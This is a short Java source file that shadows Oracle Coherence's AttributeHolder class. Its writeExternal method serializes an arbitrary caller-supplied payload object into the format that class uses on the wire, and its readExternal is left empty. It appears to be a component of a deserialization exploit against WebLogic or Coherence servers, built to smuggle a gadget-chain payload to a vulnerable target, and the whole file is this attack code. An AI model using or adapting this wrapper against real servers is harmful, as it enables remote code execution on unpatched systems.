package com.tangosol.coherence.servlet;

import com.tangosol.io.ResolvingObjectOutputStream;
import com.tangosol.util.ExternalizableHelper;

import java.io.*;

public class AttributeHolder implements Externalizable {

    private transient Object payload;

    public AttributeHolder(Object payload) {
        this.payload = payload;
    }


    public void writeExternal(DataOutput out) throws IOException {
        ExternalizableHelper.writeUTF(out, "conkatzzzzzz");
        out.writeByte(11);

        OutputStream stream = ExternalizableHelper.getOutputStream(out);
        ObjectOutput objectOutput = new ResolvingObjectOutputStream(stream);
        objectOutput.writeObject(this.payload);
        objectOutput.close();

        out.writeBoolean(false);
        out.writeBoolean(false);
        out.writeBoolean(false);
    }

    public void writeExternal(ObjectOutput out) throws IOException {
        this.writeExternal((DataOutput)out);
    }

    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {

    }
}
